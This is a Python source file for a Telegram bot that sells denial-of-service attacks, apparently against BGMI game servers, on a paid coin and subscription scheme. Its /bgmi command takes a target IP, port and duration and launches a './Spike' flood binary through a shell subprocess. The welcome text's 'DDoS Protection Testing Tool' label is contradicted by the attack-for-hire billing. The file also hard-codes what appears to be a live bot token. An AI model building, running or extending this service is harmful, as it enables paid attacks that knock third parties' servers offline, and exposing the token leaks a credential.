import os
import re
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import threading
import asyncio
from datetime import datetime, timedelta, timezone
from PIL import Image
import imagehash
import time
import requests
from telebot import TeleBot, types
from requests.exceptions import ReadTimeout

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and channel IDs
TOKEN = '7788865701:AAFLaelRum0FmfvJG_utuCqq2zT1OPZ4AIk'  # Replace with your actual bot token
CHANNEL_ID = '-1002298552334'  # Replace with your specific channel or group ID for attacks
FEEDBACK_CHANNEL_ID = '-1002124760113'  # Replace with your specific channel ID for feedback
message_queue = []

# Official channel details
OFFICIAL_CHANNEL = "@titanfreeop"  # Replace with your channel username or ID
CHANNEL_LINK = "https://t.me/titanfreeop"  # Replace with your channel link

# Initialize the bot
bot = telebot.TeleBot(TOKEN)
# Configure requests session with timeout
session = requests.Session()
session.timeout = 60  # 60 seconds timeout for all requests
# Apply custom session to the bot
bot.session = session

# Global control variables
attack_in_progress = False
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)
user_cooldowns = {}  # Stores cooldown end times for users

# Configuration
COOLDOWN_DURATION = 60  # 1 minute cooldown
EXEMPTED_USERS = [7163028849, 7184121244]
MAX_ATTACK_DURATION = 180  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)
ATTACK_COST = 5  # Coins deducted per attack

# File paths
USERS_FILE = "users.txt"
BALANCE_FILE = "balance.txt"

def load_users():
    """Load users with access from file."""
    users = {}
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            for line in f:
                uid, expiry = line.strip().split()
                users[int(uid)] = datetime.strptime(expiry, "%Y-%m-%d")
    return users

def save_users(users):
    """Save users with access to file."""
    with open(USERS_FILE, 'w') as f:
        for uid, expiry in users.items():
            f.write(f"{uid} {expiry.strftime('%Y-%m-%d')}\n")

def load_balances():
    """Load user balances from file."""
    balances = {}
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r') as f:
            for line in f:
                uid, balance = line.strip().split()
                balances[int(uid)] = int(balance)
    return balances

def save_balances(balances):
    """Save user balances to file."""
    with open(BALANCE_FILE, 'w') as f:
        for uid, balance in balances.items():
            f.write(f"{uid} {balance}\n")

def is_member(user_id):
    """Check if the user is a member of the official channel."""
    try:
        chat_member = bot.get_chat_member(OFFICIAL_CHANNEL, user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception as e:
        logging.error(f"Failed to check membership: {e}")
        return False

def sanitize_filename(filename):
    """Sanitize filenames to prevent path traversal."""
    return re.sub(r'[^\w_.-]', '_', filename)

def get_image_hash(image_path):
    """Generate perceptual hash for image."""
    with Image.open(image_path) as img:
        return str(imagehash.average_hash(img))

def safe_reply_to(message, text, retries=3):
    for _ in range(retries):
        try:
            return bot.reply_to(message, text)
        except ReadTimeout:
            logging.warning("Timeout occurred, retrying...")
            continue
    logging.error("Failed to send message after multiple retries")

def reset_daily_counts():
    """Reset daily counters at midnight IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    if ist_now >= reset_time + timedelta(days=1):
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)

def has_access(user_id):
    """Check if user has access either through subscription or balance."""
    users = load_users()
    balances = load_balances()
    
    # Check if user is exempted
    if user_id in EXEMPTED_USERS:
        return True
    
    # Check subscription access
    if user_id in users and datetime.now() < users[user_id]:
        return True
    
    # Check balance access
    if user_id in balances and balances[user_id] >= ATTACK_COST:
        return True
    
    return False

@bot.message_handler(commands=['users'])
def list_users(message):
    """List all users with their access plans and balances."""
    if message.from_user.id not in EXEMPTED_USERS:
        bot.reply_to(message, "⚠️ Only admins can use this command.")
        return

    users = load_users()
    balances = load_balances()
    
    if not users and not balances:
        bot.reply_to(message, "No users found in the system.")
        return
    
    response = "📊 *User List* 📊\n\n"
    response += "🆔 User ID | 📅 Plan Expiry | 💰 Balance\n"
    response += "--------------------------------\n"
    
    # Combine all unique user IDs
    all_user_ids = set(users.keys()).union(set(balances.keys()))
    
    for user_id in sorted(all_user_ids):
        # Get user info
        plan_info = "No plan" 
        if user_id in users:
            days_left = (users[user_id] - datetime.now()).days
            plan_info = f"{users[user_id].strftime('%Y-%m-%d')} ({days_left}d left)"
        
        balance_info = balances.get(user_id, 0)
        
        # Check if user is exempted
        exempt_tag = " (ADMIN)" if user_id in EXEMPTED_USERS else ""
        
        response += f"{user_id}{exempt_tag} | {plan_info} | {balance_info} coins\n"
    
    # Add summary
    active_users = sum(1 for uid in users if datetime.now() < users[uid])
    total_balance = sum(balances.values())
    
    response += "\n📈 *Summary*\n"
    response += f"👥 Total users: {len(all_user_ids)}\n"
    response += f"✅ Active plans: {active_users}\n"
    response += f"💰 Total coins in circulation: {total_balance}\n\n"
    response += "Use /add <uid> <days> to add plan\n"
    response += "Use /add_balance <uid> <amount> to add coins"
    
    try:
        bot.reply_to(message, response, parse_mode="Markdown")
    except Exception as e:
        # If message is too long, split it
        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
        for part in parts:
            bot.reply_to(message, part, parse_mode="Markdown")

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global attack_in_progress
    reset_daily_counts()
    user_id = message.from_user.id

    # Check if user has joined the official channel
    if not is_member(user_id):
        # Create a "Join Channel" button
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🌟 Join Official Channel 🌟", url=CHANNEL_LINK))
        markup.add(InlineKeyboardButton("✅ I've Joined", callback_data="check_membership"))

        bot.reply_to(
            message,
            "🚨 *Access Denied* 🚨\n\n"
            "To use this bot, you must join our official channel.\n"
            "Click the button below to join and then press *'I've Joined'* to verify.",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return

    # Channel restriction check
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, "⚠️ Unauthorized usage detected!")
        return

    # Check if user has access
    if not has_access(user_id):
        bot.reply_to(
            message,
            "🚫 *Access Denied* 🚫\n\n"
            "You don't have active access to use this bot.\n"
            "Please contact @TITANOP24 to purchase a plan.",
            parse_mode="Markdown"
        )
        return

    # Check cooldown
    if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
        remaining = user_cooldowns[user_id] - datetime.now()
        bot.reply_to(message, f"⏳ Cooldown active. Please wait {remaining.seconds} seconds.")
        return

    # Attack concurrency control
    if attack_in_progress:
        bot.reply_to(message, "⚡ Another attack is running. Wait your turn.")
        return

    # Process attack
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError("Usage: /bgmi <IP> <PORT> <DURATION>")

        ip, port, duration = args
        if not (ip.count('.') == 3 and all(0<=int(p)<=255 for p in ip.split('.'))):
            raise ValueError("Invalid IP address")
        if not port.isdigit() or not 0<=int(port)<=65535:
            raise ValueError("Invalid port")
        if not duration.isdigit():
            raise ValueError("Invalid duration")

        duration = int(duration)
        if duration > MAX_ATTACK_DURATION:
            raise ValueError(f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")

        # Check and deduct balance if not exempted
        if user_id not in EXEMPTED_USERS:
            balances = load_balances()
            if user_id in balances and balances[user_id] >= ATTACK_COST:
                balances[user_id] -= ATTACK_COST
                save_balances(balances)
            else:
                raise ValueError("Insufficient balance. Please top up.")

        # Update attack status and set cooldown
        attack_in_progress = True
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Get attacker's username or full name
        user = message.from_user
        attacker_name = f"@{user.username}" if user.username else user.full_name

        # Create a "Support" button
        support_button = InlineKeyboardMarkup()
        support_button.add(InlineKeyboardButton("🙏 Support 🙏", url="https://t.me/titanfreeop"))

        # Send attack confirmation with attacker's name and support button
        bot.reply_to(
            message,
            f"🚀 Attack Sent Successfully! 🚀\n"
            f"🎯 Target:- {ip}:{port}\n"
            f"⏳ Time:- {duration}s\n"
            f"👤 Attacker:- {attacker_name}\n"
            f"💲 Coins deducted: {ATTACK_COST}\n"
            f"⏱️ Cooldown: {COOLDOWN_DURATION}s",
            reply_markup=support_button
        )

        # Execute the attack
        asyncio.run(execute_attack(ip, port, duration, message.from_user.first_name))

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")
        logging.error(f"Attack error: {str(e)}")
    finally:
        attack_in_progress = False

@bot.message_handler(commands=['add'])
def add_user_command(message):
    """Add user access for specific duration."""
    if message.from_user.id not in EXEMPTED_USERS:
        bot.reply_to(message, "⚠️ Only admins can use this command.")
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 2:
            raise ValueError("Usage: /add <user_id> <days>")

        user_id = int(args[0])
        days = int(args[1])

        users = load_users()
        expiry_date = datetime.now() + timedelta(days=days)
        users[user_id] = expiry_date
        save_users(users)

        bot.reply_to(message, f"✅ User {user_id} granted access for {days} days until {expiry_date.strftime('%Y-%m-%d')}")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

@bot.message_handler(commands=['add_balance'])
def add_balance_command(message):
    """Add balance to user account."""
    if message.from_user.id not in EXEMPTED_USERS:
        bot.reply_to(message, "⚠️ Only admins can use this command.")
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 2:
            raise ValueError("Usage: /add_balance <user_id> <amount>")

        user_id = int(args[0])
        amount = int(args[1])

        balances = load_balances()
        balances[user_id] = balances.get(user_id, 0) + amount
        save_balances(balances)

        bot.reply_to(message, f"✅ Added {amount} coins to user {user_id}. New balance: {balances[user_id]}")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

@bot.message_handler(commands=['balance'])
def check_balance_command(message):
    """Check user's balance."""
    user_id = message.from_user.id
    balances = load_balances()
    balance = balances.get(user_id, 0)
    
    bot.reply_to(
        message,
        f"💰 Your current balance: {balance} coins\n"
        f"💸 Cost per attack: {ATTACK_COST} coins\n\n"
        f"To top up, contact @TITANOP24"
    )

@bot.callback_query_handler(func=lambda call: call.data == "check_membership")
def check_membership(call):
    """Handle the 'I've Joined' button click."""
    user_id = call.from_user.id
    if is_member(user_id):
        bot.answer_callback_query(call.id, "✅ Thank you for joining! You can now use /bgmi.")
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet. Please join and try again.")

async def execute_attack(ip, port, duration, username):
    """Run attack command asynchronously with predefined packet size and thread count."""
    try:
        # Start the attack process with predefined values
        proc = await asyncio.create_subprocess_shell(
            f"./Spike {ip} {port} {duration} 12 750",
            stderr=asyncio.subprocess.PIPE
        )

        # Wait for the attack duration to complete
        await asyncio.sleep(duration)

        # Send attack completion message
        bot.send_message(
            CHANNEL_ID,
            f"✅ Attack on {ip}:{port} completed! "
            f"Duration: {duration}s"
        )
    except Exception as e:
        # Send error message if something goes wrong
        bot.send_message(
            CHANNEL_ID,
            f"❌ Attack on {ip}:{port} failed: {str(e)}"
        )
    finally:
        # Ensure the process is terminated
        if proc and proc.returncode is None:
            proc.terminate()
            await proc.wait()

@bot.callback_query_handler(func=lambda call: call.data == "start_bgmi")
def callback_query(call):
    bot.answer_callback_query(call.id)  # Acknowledge the callback
    bot.send_message(call.message.chat.id, "Please type /bgmi in the chat to continue.")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = """
    🚀 *Welcome to BGMI Attack Bot* 🛡️
    
    *_A Powerful DDoS Protection Testing Tool_*
    
    📌 *Quick Start Guide*
    1️⃣ Use /bgmi command to start attack
    2️⃣ Follow format: /bgmi IP PORT TIME
    3️⃣ Ensure you have sufficient balance
    
    ⚠️ *Rules*
    - Max attack time: 1 minutes ⏳
    - Cost per attack: 5 coins 💰
    - Must join official channel 📢
    - Cooldown: 60 seconds between attacks ⏱️
    
    🔗 Support: @titanfreeop
    🔰 Owner : @Titanop24
    """
    
    # Add quick action buttons
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("⚡ Start Attack", callback_data='start_bgmi'),
        telebot.types.InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
    )
    
    bot.send_message(
        message.chat.id,
        welcome_text,
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = """
    🔧 *BGMI Bot Help Center* 🛠️
    
    📝 *Available Commands*
    /start - Show welcome message 🌟
    /bgmi - Start attack 🚀
    /help - Show this help message ❓
    /balance - Check your coins balance 💰
    
    🎯 *Attack Format*
    `/bgmi 1.1.1.1 80 60`
    - IP: Target IP address 🌐
    - Port: Target port 🔌
    - Time: Attack duration in seconds ⏱️
    
    💰 *Balance System*
    - Each attack costs 5 coins
    - Contact @TITANOP24 to purchase coins
    - 60 second cooldown between attacks ⏱️
    
    📌 *Need Help?*
    Contact support: @titanfreeop
    Report issues: @Titanop24
    """
    
    # Add support buttons
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(
        telebot.types.InlineKeyboardButton("🆘 Immediate Support", url='t.me/Titanop24'),
        telebot.types.InlineKeyboardButton("💰 Buy Coins", url='t.me/Titanop24')
    )
    
    bot.send_message(
        message.chat.id,
        help_text,
        parse_mode='Markdown',
        reply_markup=markup
    )

def message_worker():
    while True:
        if message_queue:
            msg = message_queue.pop(0)
            try:
                bot.send_message(msg['chat_id'], msg['text'])
            except ReadTimeout:
                logging.error("Async message failed after timeout")
        time.sleep(1)

# Start worker thread
threading.Thread(target=message_worker, daemon=True).start()

if __name__ == "__main__":
    logging.info("Bot started")
    bot.polling(none_stop=True)
